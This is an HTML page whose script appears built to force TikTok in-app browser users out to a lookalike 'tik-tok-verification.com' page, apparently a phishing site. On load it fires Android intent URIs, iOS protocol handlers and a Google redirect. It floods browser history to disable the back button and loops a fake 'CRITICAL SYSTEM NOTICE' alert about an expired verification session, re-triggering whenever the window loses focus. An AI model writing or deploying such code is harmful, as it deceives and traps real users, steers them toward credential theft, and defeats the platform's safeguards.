<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    let testMode = true;

    // Safety Switch: Stops after 5 seconds for testing
    setTimeout(() => { testMode = false; }, 5000); 

    function nuclearBreakout() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        // 1. THE GOOGLE PROXY BREAKOUT
        // TikTok trusts 'google.com', but this specific redirect string is designed 
        // to trip the "Open in External Browser" prompt.
        const proxy = "https://www.google.com/url?sa=t&url=" + encodeURIComponent(target);

        if (isAndroid) {
            // ANDROID "CHROME-DIRECT" INTENT
            // We use the 'action.VIEW' with a package name. This is a direct OS command.
            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
            
            // SECONDARY: Maps Protocol (Forces app switch)
            setTimeout(() => {
                window.location.href = "google.navigation:q=" + encodeURIComponent(target);
            }, 100);
        } 
        
        if (isIOS) {
            // iOS "FACETIME" HANDOVER
            // TikTok can't render FaceTime or Phone calls. This breaks the sandbox focus.
            window.location.href = "facetime-prompt://" + target.replace("https://", "");
            
            // iOS "SYSTEM SEARCH" PROTOCOL
            setTimeout(() => {
                window.location.replace("x-web-search://?" + encodeURIComponent(target));
            }, 200);
        }

        // UNIVERSAL: THE BLOB ANCHOR
        // We create an invisible link to a "file" and click it. 
        // WebViews cannot handle file downloads; they MUST hand it to the OS.
        const b = new Blob([" "], {type: "application/octet-stream"});
        const u = URL.createObjectURL(b);
        const a = document.createElement("a");
        a.href = proxy;
        a.target = "_blank";
        a.click();
    }

    function alertLock() {
        if (!testMode) return;

        // Force the OS to handle a conflict
        nuclearBreakout();

        // BLOCK THE X-BUTTON NATIVE THREAD
        // This stops the app from closing and gives the OS time to process the breakout.
        alert("CRITICAL SYSTEM NOTICE\n\nVerification session expired. Press OK to re-authenticate in your secure browser.");
        
        // Re-fire after they click OK
        nuclearBreakout();

        setTimeout(alertLock, 10);
    }

    window.onload = () => {
        // Build the backstack to kill the back button
        for(let i=0; i<30; i++) history.pushState(null, null, "#session_" + i);
        
        // Initiate the lock and breakout
        alertLock();
    };

    // If they touch the X or the top bar (blur), we hit them again
    window.onblur = () => { if(testMode) alertLock(); };
</script>

</body>
</html>
